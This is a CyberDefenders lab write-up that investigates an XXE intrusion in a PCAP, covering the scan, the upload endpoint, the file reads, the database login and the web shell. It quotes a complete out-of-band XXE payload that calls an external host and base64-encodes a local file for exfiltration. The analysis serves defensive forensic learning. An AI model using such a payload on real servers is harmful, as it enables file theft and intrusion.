---
title: 'XXE Infiltration - CyberDefenders Labs'
date: 2025-10-10 19:00:00 +0530
categories: [blue-teaming]
tags:
- Cyber-Defenders
- Network Analysis
---

## Summary:

*An automated alert has detected unusual XML data being processed by the server, which suggests a potential XXE (XML External Entity) Injection attack. This raises concerns about the integrity of the company's customer data and internal systems, prompting an immediate investigation.*

*Analyze the provided PCAP file using the network analysis tools available to you. Your goal is to identify how the attacker gained access and what actions they took.*

### What is XXE (XML External Entity attack)

***XML External Entity (XXE)** is a vulnerability that occurs when an application parses attacker-controlled XML with a misconfigured parser that allows DTD/entity resolution. By embedding a <!DOCTYPE> that defines an external entity (e.g., file:// or http://), an attacker can trick the parser into reading local files, querying internal services (SSRF), or exfiltrating data—all before the application code even sees the input. XXE is language-agnostic (PHP, Java, .NET, etc. are all affected) and is typically triggered through XML inputs such as API requests, file uploads (e.g., .xml, .svg), SOAP/SAML, or import features.*

Q. **Identifying the open ports discovered by an attacker helps us understand which services are exposed and potentially vulnerable. Can you identify the highest-numbered port that is open on the victim's web server?**

A. To determine the highest-numbered open port on the victim’s web server, I first used Wireshark’s **Conversations** view to confirm there were only two active hosts in the capture: `210.106.114.183` and `50.239.151.185`. The victim is the host that responds to probes with **SYN-ACK** packets, while the attacker is the one initiating **SYN** scans and receiving **RST** replies from closed ports. 

```c
  ├─► Send TCP SYN to <target>:<port>
  │
  ├─ If SYN-ACK received?
  │        │
  │        ├─ Yes ─► Send RST (don’t finish handshake)
  │        │           │
  │        │           └─► Classification: OPEN (or OPEN|FILTERED if oddities)
  │        │
  │        └─ No
  │
  ├─ If RST/ACK (or plain RST) received?
  │        │
  │        ├─ Yes ─► Classification: CLOSED
  │        │
  │        └─ No
```

![image.png]({{ '/assets/img/XXE_Infiltration/image.png' | relative_url }})

With the roles established, I filtered specifically for successful connection attempts—i.e., SYN-ACKs sent by the victim to the attacker—using:

```c
tcp.flags.syn == 1 && tcp.flags.ack == 1 && ip.dst == 210.106.114.183
```

![image.png]({{ '/assets/img/XXE_Infiltration/image%201.png' | relative_url }})

Q. **By identifying the vulnerable PHP script, security teams can directly address and mitigate the vulnerability. What's the complete URI of the PHP script vulnerable to XXE Injection?**

A. To pinpoint the PHP endpoint abused for the XXE, I first constrained the capture to attacker-originated HTTP requests that reference PHP files. Using the display filter

```c
ip.src_host== 210.106.114.183 && http && http.request.uri contains ".php"
```

![image.png]({{ '/assets/img/XXE_Infiltration/image%202.png' | relative_url }})

Wireshark showed a sweep of PHP paths on the victim (`/books.php`, `/contact.php`, `/index.php`, etc.). Since XXE payloads are typically delivered via **POST**, I narrowed further to

```c
ip.src_host== 210.106.114.183 && http && http.request.uri contains ".php" && http.request.method == POST
```

which consistently surfaced a file-handling endpoint: **`/review/upload.php`**. Combining the path with the destination and scheme visible in the trace yields the complete URI of the vulnerable script “*hxxp://50.239.151.185/review/upload.php*”

![image.png]({{ '/assets/img/XXE_Infiltration/image%203.png' | relative_url }})

Q. **To construct the attack timeline and determine the initial point of compromise. What's the name of the first malicious XML file uploaded by the attacker?**

A. I traced the earliest `POST` to the upload handler `/review/upload.php`. The multipart body shows an XML file named **TheGreatGatsby.xml**. Inside, the attacker embeds a `<!DOCTYPE …>` that defines an external entity pointing to `file:///etc/passwd`, then references it in the document—an explicit XXE attempt delivered via file upload.

![image.png]({{ '/assets/img/XXE_Infiltration/image%204.png' | relative_url }})

Other malicious XML uploads map directly to sensitive files on the server:

- `1984.xml` → `/var/www/html/index.php`
- `To Kill a Mockingbird.xml` → `/var/www/html/config.php`

Beyond the local file reads, the attacker also uploaded **`PrideandPrejudice.xml`**, which attempts an out-of-band XXE. The XML includes a `<!DOCTYPE>` that references an external resource and tries to base64-wrap a local file via `php://filter`, indicating an effort to exfiltrate data without relying on on-page reflection.

```c
Content-Disposition: form-data; name="file"; filename="PrideandPrejudice.xml"
Content-Type: text/xml

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % payload SYSTEM "http://203.0.113.15/booking.php">
<!ENTITY % internals "<!ENTITY file SYSTEM 'php://filter/read=convert.base64-encode/resource=%payload;'>">]>
<foo>&file;</foo>
```

Q. **Understanding which sensitive files were accessed helps evaluate the breach's potential impact. What's the name of the web app configuration file the attacker read?**

&&

Q. **Following the database user compromise. What is the timestamp of the attacker's initial connection to the MySQL server using the compromised credentials after the exposure?**

A. I inspected later HTTP streams from the same upload workflow. One malicious XML explicitly set the external entity to `file:///var/www/html/config.php`. The server parsed the upload and expanded the entity, returning the PHP configuration file in the response

![image.png]({{ '/assets/img/XXE_Infiltration/image%205.png' | relative_url }})

The leaked file is **`config.php`** at **`/var/www/html/config.php`**, which reveals database connection details (host, name, user, and password).

Q. **Following the database user compromise. What is the timestamp of the attacker's initial connection to the MySQL server using the compromised credentials after the exposure?**

A. To verify database access after the config leak, I filtered for MySQL traffic on TCP **3306** and followed the first TCP 3-way handshake to the server. Immediately after the **Server Greeting**, the client sends a **Login Request**—this is the moment compromised credentials are first used. The activity started from “2024-05-31 12:08”

![image.png]({{ '/assets/img/XXE_Infiltration/image%206.png' | relative_url }})

Q. **To eliminate the threat and prevent further unauthorized access, can you identify the name of the web shell that the attacker uploaded for remote code execution and persistence?**

A. The trace shows repeated executions of a PHP shell using a `cmd` parameter:

![image.png]({{ '/assets/img/XXE_Infiltration/image%207.png' | relative_url }})

This pattern is conclusive evidence that a PHP web shell named **booking.php** is present and actively used for RCE.